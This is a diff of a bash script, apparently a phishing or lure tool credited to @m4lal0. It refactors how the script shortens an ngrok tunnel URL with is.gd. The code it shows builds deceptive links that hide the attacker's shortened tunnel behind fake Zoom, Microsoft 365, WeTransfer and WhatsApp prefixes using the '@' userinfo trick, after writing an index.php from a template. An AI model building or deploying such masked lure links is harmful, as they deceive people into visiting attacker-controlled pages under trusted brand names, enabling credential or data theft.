@@ -68,7 +68,7 @@ On_White='\033[47m'     # White
 
 trap ctrl_c INT
 readonly BY='By @m4lal0'
-VERSION=1.0.1
+VERSION=1.0.2
 
 function stopServices() {
     CHECKNGROK=$(ps aux | grep -o "ngrok" | head -n1)
@@ -341,9 +341,9 @@ function templates(){
     startServices
 
     sed 's+forwarding_link+'$URL'+g' templates/template.php > index.php
+    SHORT=$(curl -s "https://is.gd/create.php?format=simple&url=${URL}")
+    SHORTER=${SHORT#https://}
     if [[ $OPTION_TEMPLATE -eq 1 ]]; then
-        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
-        SHORTER=${SHORT#https://}
         MASK="https://zoom.us"
         WORDS="support-download"
         URLMASK=$MASK-$WORDS@$SHORTER
@@ -355,8 +355,6 @@ function templates(){
         fi
     fi
     if [[ $OPTION_TEMPLATE -eq 2 ]]; then
-        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
-        SHORTER=${SHORT#https://}
         MASK="https://www.microsoft.com"
         WORDS="es-mx-microsoft-365"
         URLMASK=$MASK-$WORDS@$SHORTER
@@ -368,8 +366,6 @@ function templates(){
         fi
     fi
     if [[ $OPTION_TEMPLATE -eq 3 ]]; then
-        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
-        SHORTER=${SHORT#https://}
         MASK="https://www.wetransfer.com"
         WORDS="file"
         URLMASK=$MASK-$WORDS@$SHORTER
@@ -381,8 +377,6 @@ function templates(){
         fi
     fi
     if [[ $OPTION_TEMPLATE -eq 4 ]]; then
-        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
-        SHORTER=${SHORT#https://}
         MASK="https://www.whatsapp.com"
         WORDS="download"
         URLMASK=$MASK-$WORDS@$SHORTER
